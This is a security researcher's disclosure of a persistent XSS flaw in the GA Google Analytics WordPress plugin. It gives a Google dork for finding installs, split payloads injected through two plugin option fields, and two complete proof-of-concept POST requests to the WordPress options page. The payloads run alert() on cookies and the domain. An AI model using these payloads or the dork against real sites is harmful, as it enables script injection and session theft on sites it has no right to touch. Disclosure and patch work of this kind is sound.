/*!
- # VULNERABILITY: GA Google Analytics WordPress Plugin <= 20210211 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/ga-google-analytics/
- # DATE: 2021-04-04
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Jeff Starr [ https://plugin-planet.com ]
- # SOFTWARE VERSION: <= 20210211
- # SOFTWARE LINK: https://wordpress.org/plugins/ga-google-analytics/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the GA Google Analytics plugin through v20210211 for WordPress.

[i] Vulnerable parameter(s): &gap_options[tracker_object]= and &gap_options[gap_custom_code]=.

[i] To successfully inject a payload, we need to break the context of the main GA script. This can be done by using two parts of the payload that complement each other: the first part is placed in the &gap_options[tracker_object]= parameter, the second in &gap_options[gap_custom_code]= parameter. F.e.: the first payload will end up looking like ga('create', 'm0ze', 'auto', '');alert(document.cookie);/*);*/;alert(document.domain); and we'll see two alerts (because of commented /*);*/ part).



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] Part #1: '\');alert(document.cookie);/* | Part #2: */;alert(document.domain);

[$] Part #1: '');alert(document.cookie);alert('m0ze' | Part #2: ;alert(document.domain);



### -- [ PoC #1 | Authenticated Persistent XSS | Payload #1: ]

[!] POST /wp-admin/options.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 476
Cookie: [admin cookies]

option_page=gap_plugin_options&action=update&_wpnonce=88a432b100&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dga-google-analytics%26settings-updated%3Dtrue&gap_options%5Bgap_id%5D=m0ze&gap_options%5Bgap_enable%5D=1&gap_options%5Bgap_location%5D=header&gap_options%5Btracker_object%5D=%27%5C%27%29%3Balert%28document.cookie%29%3B%2F*&gap_options%5Bgap_custom_code%5D=*%2F%3Balert%28document.domain%29%3B&gap_options%5Bgap_custom%5D=&gap_options%5Badmin_area%5D=1



### -- [ PoC #2 | Authenticated Persistent XSS | Payload #2: ]

[!] POST /wp-admin/options.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 453
Cookie: [admin cookies]

option_page=gap_plugin_options&action=update&_wpnonce=88a432b100&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dga-google-analytics%26settings-updated%3Dtrue&gap_options%5Bgap_id%5D=m0ze&gap_options%5Bgap_enable%5D=1&gap_options%5Bgap_location%5D=header&gap_options%5Btracker_object%5D=%27%27%29%3Balert%28document.cookie%29%3Balert%28%27m0ze%27&gap_options%5Bgap_custom_code%5D=%3Balert%28document.domain%29%3B&gap_options%5Bgap_custom%5D=



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
